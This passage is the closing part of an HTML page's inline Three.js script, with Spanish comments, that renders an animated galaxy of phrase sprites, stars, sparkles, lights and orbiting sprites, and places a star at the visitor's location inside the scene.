    for (let i = 0; i < CONFIG.fraseCount; i++) {
      const phrase = CONFIG.frases[i % CONFIG.frases.length];
      const texture = createPhraseTexture(phrase);
      texture.minFilter = THREE.LinearFilter;
      texture.magFilter = THREE.LinearFilter;

      const spriteMaterial = new THREE.SpriteMaterial({
        map: texture,
        transparent: true,
        blending: THREE.NormalBlending,
        depthTest: true,
        depthWrite: false
      });
      const sprite = new THREE.Sprite(spriteMaterial);

      const angle = (i % armSlots) * (Math.PI * 2 / armSlots);
      const armAngle = Math.floor(i / armSlots) * (Math.PI * 2 / CONFIG.arms);
      const distance = 80 + Math.pow(i / CONFIG.fraseCount, 0.8) * (CONFIG.radius - 80);

      sprite.position.set(
        Math.cos(angle + armAngle) * distance,
        (Math.random() - 0.5) * 80,
        Math.sin(angle + armAngle) * distance
      );

      const baseScale = isLowPower ? 80 : 100;
      sprite.scale.set(baseScale, baseScale * 0.22, 1);
      sprite.userData = { baseScale, index: i };
      galaxyGroup.add(sprite);
    }

    // ==================== ESTRELLAS DE FONDO ====================
    const starGeometry = new THREE.BufferGeometry();
    const starPositions = new Float32Array(STAR_COUNT * 3);
    const starColors = new Float32Array(STAR_COUNT * 3);

    for (let i = 0; i < STAR_COUNT; i++) {
      starPositions[i * 3] = (Math.random() - 0.5) * 8000;
      starPositions[i * 3 + 1] = (Math.random() - 0.5) * 8000;
      starPositions[i * 3 + 2] = (Math.random() - 0.5) * 8000;

      const temp = Math.random();
      if (temp < 0.1) {
        starColors[i * 3] = 0.7;
        starColors[i * 3 + 1] = 0.8;
        starColors[i * 3 + 2] = 1.0;
      } else if (temp < 0.2) {
        starColors[i * 3] = 1.0;
        starColors[i * 3 + 1] = 0.9;
        starColors[i * 3 + 2] = 0.7;
      } else {
        starColors[i * 3] = 0.9 + Math.random() * 0.1;
        starColors[i * 3 + 1] = 0.9 + Math.random() * 0.1;
        starColors[i * 3 + 2] = 0.9 + Math.random() * 0.1;
      }
    }

    starGeometry.setAttribute('position', new THREE.BufferAttribute(starPositions, 3));
    starGeometry.setAttribute('color', new THREE.BufferAttribute(starColors, 3));

    const starMaterial = new THREE.PointsMaterial({
      size: 1.5,
      vertexColors: true,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
      transparent: true,
      opacity: 0.9
    });
    scene.add(new THREE.Points(starGeometry, starMaterial));

    // ==================== PARTÍCULAS BRILLANTES ====================
    const sparkleGeometry = new THREE.BufferGeometry();
    const sparkleCount = isLowPower ? 400 : 1000;
    const sparklePositions = new Float32Array(sparkleCount * 3);

    for (let i = 0; i < sparkleCount; i++) {
      const radius = 200 + Math.random() * 600;
      const theta = Math.random() * Math.PI * 2;
      const phi = Math.random() * Math.PI;

      sparklePositions[i * 3] = radius * Math.sin(phi) * Math.cos(theta);
      sparklePositions[i * 3 + 1] = radius * Math.sin(phi) * Math.sin(theta);
      sparklePositions[i * 3 + 2] = radius * Math.cos(phi);
    }

    sparkleGeometry.setAttribute('position', new THREE.BufferAttribute(sparklePositions, 3));

    const sparkleMaterial = new THREE.PointsMaterial({
      size: 2.5,
      color: 0xffffff,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
      transparent: true,
      opacity: 0.7
    });
    const sparkles = new THREE.Points(sparkleGeometry, sparkleMaterial);
    scene.add(sparkles);

    // ==================== ILUMINACIÓN ====================
    scene.add(new THREE.AmbientLight(0x334466, 1.2));

    const pointLight = new THREE.PointLight(0xff88aa, 2, 800, 1);
    pointLight.position.set(0, 50, 0);
    pointLight.castShadow = true;
    pointLight.shadow.mapSize.width = 1024;
    pointLight.shadow.mapSize.height = 1024;
    scene.add(pointLight);

    const pointLight2 = new THREE.PointLight(0x88aaff, 1.5, 600, 1);
    pointLight2.position.set(100, -30, 50);
    scene.add(pointLight2);

    const pointLight3 = new THREE.PointLight(0xffcc88, 1.5, 600, 1);
    pointLight3.position.set(-100, 20, -50);
    scene.add(pointLight3);

    // ==================== SPRITES ORBITANTES ====================
    const orbitGroup = new THREE.Group();
    scene.add(orbitGroup);

    new THREE.TextureLoader().load(
      CONFIG.orbitSpriteUrl,
      (texture) => {
        for (let i = 0; i < ORBIT_COUNT; i++) {
          const spriteMaterial = new THREE.SpriteMaterial({
            map: texture,
            transparent: true,
            depthWrite: false,
            blending: THREE.AdditiveBlending,
            opacity: 0.8
          });
          const sprite = new THREE.Sprite(spriteMaterial);
          const radius = 180 + Math.random() * 500;
          sprite.userData = {
            angle: Math.random() * Math.PI * 2,
            radius,
            speed: 0.15 + Math.random() * 0.5,
            height: (Math.random() - 0.5) * 150,
            verticalSpeed: 0.02 + Math.random() * 0.08
          };
          const s = 50 + Math.random() * 70;
          sprite.scale.set(s, s, 1);
          sprite.position.set(
            Math.cos(sprite.userData.angle) * radius,
            sprite.userData.height,
            Math.sin(sprite.userData.angle) * radius
          );
          orbitGroup.add(sprite);
        }
      },
      undefined,
      () => console.warn('No se pudo cargar el sprite orbitante; se omite ese elemento decorativo.')
    );

    // ==================== INICIALIZAR UBICACIÓN EN LA GALAXIA ====================
    async function setupGalaxyLocation() {
      console.log('🌌 Esperando ubicación para crear estrella en la galaxia...');
      let attempts = 0;
      while (!userLocation && attempts < 30) {
        await new Promise(resolve => setTimeout(resolve, 500));
        attempts++;
      }
      
      if (userLocation) {
        console.log('⭐ Creando estrella de ubicación en la galaxia');
        createLocationStar(userLocation.latitude, userLocation.longitude);
        await createLocationText(userLocation.latitude, userLocation.longitude);
      } else {
        console.log('❌ No se pudo crear estrella: sin ubicación');
      }
    }

    // Iniciar el setup de la galaxia después de un breve delay
    setTimeout(setupGalaxyLocation, 2000);

    // ==================== ANIMACIÓN ====================
    const clock = new THREE.Clock();
    let rafId = null;
    let running = true;

    function tick() {
      if (!running) return;
      rafId = requestAnimationFrame(tick);

      const delta = clock.getDelta();
      const elapsed = clock.getElapsedTime();

      if (!reduceMotion) {
        galaxyGroup.rotation.y = elapsed * 0.012;
        accretionDisk.rotation.z += 0.0015;
        accretionDisk2.rotation.z -= 0.001;
        nebula.rotation.y += 0.0001;
        nebula.rotation.x += 0.00005;
        sparkles.rotation.y += 0.0003;
        sparkles.rotation.x += 0.0002;

        galaxyGroup.children.forEach((sprite, i) => {
          const baseScale = sprite.userData.baseScale ?? 90;
          const scale = baseScale + Math.sin(elapsed * 2 + i) * 10;
          sprite.scale.set(scale, scale * 0.22, 1);
          sprite.material.opacity = 0.8 + Math.sin(elapsed * 3 + i) * 0.2;
        });

        orbitGroup.children.forEach((sprite, i) => {
          sprite.userData.angle += sprite.userData.speed * delta;
          sprite.userData.height += Math.sin(elapsed * 0.5 + i) * 0.3;
          sprite.position.set(
            Math.cos(sprite.userData.angle) * sprite.userData.radius,
            sprite.userData.height,
            Math.sin(sprite.userData.angle) * sprite.userData.radius
          );
          sprite.quaternion.copy(camera.quaternion);
          const s = 50 + 70 * (0.5 + 0.5 * Math.sin(elapsed + i));
          sprite.scale.set(s, s, 1);
          sprite.material.opacity = 0.5 + 0.4 * Math.abs(Math.sin(elapsed * 0.7 + i));
        });

        if (centerTextMesh && centerTextGlow) {
          const pulse = 0.5 + 0.5 * Math.abs(Math.sin(elapsed * 2.2));
          centerTextMesh.material.emissiveIntensity = 1.2 + pulse * 1.2;
          centerTextGlow.material.opacity = 0.15 + pulse * 0.2;
          const baseScale = 1.0 + 0.03 * Math.sin(elapsed * 1.6);
          centerTextMesh.scale.set(baseScale, baseScale, baseScale);
          centerTextGlow.scale.set(baseScale * 1.12, baseScale * 1.12, baseScale * 1.12);
        }

        pointLight.intensity = 1.5 + 0.8 * Math.sin(elapsed * 1.5);
        pointLight2.intensity = 1.2 + 0.6 * Math.cos(elapsed * 1.8);
      }

      controls.update();
      renderer.render(scene, camera);
    }

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        running = false;
        if (rafId) cancelAnimationFrame(rafId);
      } else if (!running) {
        running = true;
        clock.getDelta();
        tick();
      }
    });

    tick();
  </script>
</body>
</html>
